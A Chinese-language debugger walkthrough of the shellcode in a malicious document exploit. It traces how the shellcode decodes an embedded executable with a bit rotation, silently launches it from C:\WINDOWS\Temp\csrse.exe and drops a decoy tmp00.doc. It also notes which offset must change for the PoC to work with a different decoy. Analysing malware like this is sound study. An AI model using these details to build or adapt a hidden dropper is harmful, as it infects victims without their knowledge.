
```asm
00A478C7    6A 01           push    1

00A478C9    8D85 58FDFFFF   lea     eax, dword ptr [ebp-2A8]

00A478CF    50              push    eax

00A478D0    8B4D E4         mov     ecx, dword ptr [ebp-1C]

00A478D3    51              push    ecx

00A478D4    FF95 40FDFFFF   call    dword ptr [ebp-2C0]

00A478DA    8B95 A0FDFFFF   mov     edx, dword ptr [ebp-260]

00A478E0    83C2 01         add     edx, 1

00A478E3    8995 A0FDFFFF   mov     dword ptr [ebp-260], edx

00A478E9  ^ EB 9C           jmp     short 00A47887
```
一次读一个字节然后写一个字节，到新文件中.注意，数据编码方式

```asm
00A478B5    C0C1 05         rol     cl, 5
```
简单的一个数据移位

这里直接在jmp后面下断F9

```asm
00A478F5    B9 11000000     mov     ecx, 11

00A478FA    33C0            xor     eax, eax

00A478FC    8DBD 5CFDFFFF   lea     edi, dword ptr [ebp-2A4]

00A47902    F3:AB           rep     stos dword ptr es:[edi]

00A47904    C785 5CFDFFFF 4>mov     dword ptr [ebp-2A4], 44

00A4790E    8D4D F0         lea     ecx, dword ptr [ebp-10]

00A47911    51              push    ecx

00A47912    8D95 5CFDFFFF   lea     edx, dword ptr [ebp-2A4]

00A47918    52              push    edx

00A47919    6A 00           push    0

00A4791B    6A 00           push    0

00A4791D    68 00000008     push    8000000

00A47922    6A 00           push    0

00A47924    6A 00           push    0

00A47926    6A 00           push    0

00A47928    8D85 D0FEFFFF   lea     eax, dword ptr [ebp-130]

00A4792E    50              push    eax

00A4792F    6A 00           push    0

00A47931    FF95 4CFDFFFF   call    dword ptr [ebp-2B4]                         ; kernel32.CreateProcessA
```
这一段是运行exe的了 这句call直接调用

```asm
00124DD0   00A47937  /CALL 到 CreateProcessA 来自 00A47931

00124DD4   00000000  |ModuleFileName = NULL

00124DD8   00124FA8  |CommandLine = "C:\WINDOWS\Temp\csrse.exe"

00124DDC   00000000  |pProcessSecurity = NULL

00124DE0   00000000  |pThreadSecurity = NULL

00124DE4   00000000  |InheritHandles = FALSE

00124DE8   08000000  |CreationFlags = CREATE\_NO\_WINDOW

00124DEC   00000000  |pEnvironment = NULL

00124DF0   00000000  |CurrentDir = NULL

00124DF4   00124E34  |pStartupInfo = 00124E34

00124DF8   001250C8  \pProcessInfo = 001250C8
```
你会发现捆绑的exe已经执行了

接下来：

```asm
00A47937    8B4D EC         mov     ecx, dword ptr [ebp-14]

00A4793A    8D940D D0FEFFFF lea     edx, dword ptr [ebp+ecx-130]

00A47941    8B85 C4FEFFFF   mov     eax, dword ptr [ebp-13C]

00A47947    8B08            mov     ecx, dword ptr [eax]

00A47949    890A            mov     dword ptr [edx], ecx

00A4794B    8B48 04         mov     ecx, dword ptr [eax+4]

00A4794E    894A 04         mov     dword ptr [edx+4], ecx

00A47951    8B48 08         mov     ecx, dword ptr [eax+8]

00A47954    894A 08         mov     dword ptr [edx+8], ecx

00A47957    8B40 0C         mov     eax, dword ptr [eax+C]

00A4795A    8942 0C         mov     dword ptr [edx+C], eax

00A4795D    6A 00           push    0

00A4795F    68 80000000     push    80

00A47964    6A 02           push    2

00A47966    6A 00           push    0

00A47968    6A 03           push    3

00A4796A    68 00000040     push    40000000

00A4796F    8D8D D0FEFFFF   lea     ecx, dword ptr [ebp-130]

00A47975    51              push    ecx

00A47976    FF95 38FDFFFF   call    dword ptr [ebp-2C8]
```
这里建立doc文件

```asm
00124DDC   00A4797C  /CALL 到 CreateFileA 来自 00A47976

00124DE0   00124FA8  |FileName = "C:\WINDOWS\Temp\tmp00.doc"

00124DE4   40000000  |Access = GENERIC\_WRITE

00124DE8   00000003  |ShareMode = FILE\_SHARE\_READ|FILE\_SHARE\_WRITE

00124DEC   00000000  |pSecurity = NULL

00124DF0   00000002  |Mode = CREATE\_ALWAYS

00124DF4   00000080  |Attributes = NORMAL

00124DF8   00000000  \hTemplateFile = NULL
```
继续到这里

```asm
00A4797C    8945 E4         mov     dword ptr [ebp-1C], eax

00A4797F    C785 A0FDFFFF 0>mov     dword ptr [ebp-260], 0

00A47989    8B95 A0FDFFFF   mov     edx, dword ptr [ebp-260]

00A4798F    3B95 A8FDFFFF   cmp     edx, dword ptr [ebp-258]

00A47995    0F83 B7000000   jnb     00A47A52

00A4799B    6A 00           push    0

00A4799D    6A 00           push    0

00A4799F    8B85 A4FDFFFF   mov     eax, dword ptr [ebp-25C]

00A479A5    50              push    eax

00A479A6    8B8D CCFEFFFF   mov     ecx, dword ptr [ebp-134]

00A479AC    51              push    ecx

00A479AD    FF95 48FDFFFF   call    dword ptr [ebp-2B8]                         ; kernel32.SetFilePointer
```
又是一个SetFilePointer

将ebp-25c位置的值作为position，所以这里也是一个重要参数，如果文档数据改变

这里是必须改的 要不然 poc执行了找不到捆绑的正常doc文件在哪

这一整段，跟exe数据读取一样

```asm
00A47989    8B95 A0FDFFFF   mov     edx, dword ptr [ebp-260]

00A4798F    3B95 A8FDFFFF   cmp     edx, dword ptr [ebp-258]

00A47995    0F83 B7000000   jnb     00A47A52
```
注意这个位置[ebp-258] 保存的是捆绑进去的正常doc文件大小

```asm
00A4799B    6A 00           push    0

00A4799D    6A 00           push    0

00A4799F    8B85 A4FDFFFF   mov     eax, dword ptr [ebp-25C]

00A479A5    50              push    eax

00A479A6    8B8D CCFEFFFF   mov     ecx, dword ptr [ebp-134]

00A479AC    51              push    ecx

00A479AD    FF95 48FDFFFF   call    dword ptr [ebp-2B8]

00A479B3    6A 00           push    0

00A479B5    8D55 D4         lea     edx, dword ptr [ebp-2C]

00A479B8    52              push    edx

00A479B9    6A 01           push    1

00A479BB    8D85 58FDFFFF   lea     eax, dword ptr [ebp-2A8]

00A479C1    50              push    eax

00A479C2    8B8D CCFEFFFF   mov     ecx, dword ptr [ebp-134]

00A479C8    51              push    ecx

00A479C9    FF95 44FDFFFF   call    dword ptr [ebp-2BC]

00A479CF    6A 00           push    0

00A479D1    6A 00           push    0

00A479D3    8B95 A0FDFFFF   mov     edx, dword ptr [ebp-260]

00A479D9    52              push    edx

00A479DA    8B85 CCFEFFFF   mov     eax, dword ptr [ebp-134]

00A479E0    50              push    eax

00A479E1    FF95 48FDFFFF   call    dword ptr [ebp-2B8]

00A479E7    0FBE8D 58FDFFFF movsx   ecx, byte ptr [ebp-2A8]

00A479EE    C0C1 05         rol     cl, 5

00A479F1    90              nop

00A479F2    90              nop

00A479F3    90              nop

00A479F4    888D 58FDFFFF   mov     byte ptr [ebp-2A8], cl

00A479FA    6A 00           push    0

00A479FC    8D55 D4         lea     edx, dword ptr [ebp-2C]

00A479FF    52              push    edx

00A47A00    6A 01           push    1

00A47A02    8D85 58FDFFFF   lea     eax, dword ptr [ebp-2A8]

00A47A08    50              push    eax

00A47A09    8B8D CCFEFFFF   mov     ecx, dword ptr [ebp-134]

00A47A0F    51              push    ecx

00A47A10    FF95 40FDFFFF   call    dword ptr [ebp-2C0]

00A47A16    6A 00           push    0

00A47A18    8D55 D4         lea     edx, dword ptr [ebp-2C]

00A47A1B    52              push    edx

00A47A1C    6A 01           push    1

00A47A1E    8D85 58FDFFFF   lea     eax, dword ptr [ebp-2A8]

00A47A24    50              push    eax

00A47A25    8B4D E4         mov     ecx, dword ptr [ebp-1C]

00A47A28    51              push    ecx

00A47A29    FF95 40FDFFFF   call    dword ptr [ebp-2C0]

00A47A2F    8B95 A4FDFFFF   mov     edx, dword ptr [ebp-25C]

00A47A35    83C2 01         add     edx, 1

00A47A38    8995 A4FDFFFF   mov     dword ptr [ebp-25C], edx

00A47A3E    8B85 A0FDFFFF   mov     eax, dword ptr [ebp-260]

00A47A44    83C0 01         add     eax, 1

00A47A47    8985 A0FDFFFF   mov     dword ptr [ebp-260], eax

00A47A4D  ^ E9 37FFFFFF     jmp     00A47989
```
接下来关闭文件句柄

```asm
00A47A52    8B4D E4         mov     ecx, dword ptr [ebp-1C]

00A47A55    51              push    ecx

00A47A56    FF95 3CFDFFFF   call    dword ptr [ebp-2C4]
```
再来

```asm
00A47A5C    C685 58FDFFFF 0>mov     byte ptr [ebp-2A8], 0

00A47A63    8B55 E0         mov     edx, dword ptr [ebp-20]

00A47A66    2B95 A8FDFFFF   sub     edx, dword ptr [ebp-258]

00A47A6C    8995 A0FDFFFF   mov     dword ptr [ebp-260], edx

00A47A72    83BD A0FDFFFF 0>cmp     dword ptr [ebp-260], 0

00A47A79    74 2D           je      short 00A47AA8

00A47A7B    6A 00           push    0

00A47A7D    8D45 D4         lea     eax, dword ptr [ebp-2C]
```
